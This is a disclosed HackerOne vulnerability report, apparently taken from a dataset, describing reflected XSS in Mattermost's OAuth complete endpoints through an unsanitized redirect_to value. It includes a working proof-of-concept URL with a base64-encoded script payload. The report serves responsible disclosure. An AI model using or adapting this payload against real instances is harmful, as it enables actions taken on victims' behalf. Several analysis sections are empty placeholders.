---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1502099'
original_report_id: '1502099'
title: Reflected XSS in OAuth complete endpoints
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mattermost
created_at: '2022-03-06T21:01:59.436Z'
disclosed_at: '2023-09-28T09:31:32.736Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 50
asset_identifier: mattermost/mattermost-server
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS in OAuth complete endpoints

## Metadata

- HackerOne Report ID: 1502099
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mattermost
- Disclosed At: 2023-09-28T09:31:32.736Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
The following endpoints are vulnerable to reflected XSS:
```
GET /oauth/{service:[A-Za-z0-9]+}/complete
GET /api/v3/oauth/{service:[A-Za-z0-9]+}/complete
GET /signup/{service:[A-Za-z0-9]+}/complete
GET /login/{service:[A-Za-z0-9]+}/complete
```

The vulnerability exists due to the lack of sanitizing `redirect_to` field in `state` query param [here](https://github.com/mattermost/mattermost-server/blob/c114aba628e06e726aa1b5d9f3736d1fd154594c/web/oauth.go#L287-L288).

## Steps To Reproduce:

  1. Setup local mattermost instance e.g. on address [http://localhost:8065](http://localhost:8065) ([server guide](https://developers.mattermost.com/contribute/server/developer-setup/), [webapp guide](https://developers.mattermost.com/contribute/webapp/developer-setup/))
  1. Enable gitlab auth at Enable gitlab auth at [http://localhost:8065/admin_console/authentication/gitlab](http://localhost:8065/admin_console/authentication/gitlab). (There may be other ways to enable OAuth, this one seemed the easiest to me)
  1. Open the following link: [http://mattermost:8065/login/gitlab/complete?code=x&state=eyJhY3Rpb24iOiJtb2JpbGUiLCJyZWRpcmVjdF90byI6InRlc3RcIj48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4ifQ==](http://mattermost:8065/login/gitlab/complete?code=x&state=eyJhY3Rpb24iOiJtb2JpbGUiLCJyZWRpcmVjdF90byI6InRlc3RcIj48c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4ifQ==). This link contains base64-encoded payload in `state` param: `{"action":"mobile","redirect_to":"test\"><script>alert(document.domain)</script>"}`
  1. Get javascript alert with current domain.

## Impact

An attacker can distribute a link in a chat with malicious javascript code. This code can send ajax requests on behalf of the user.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
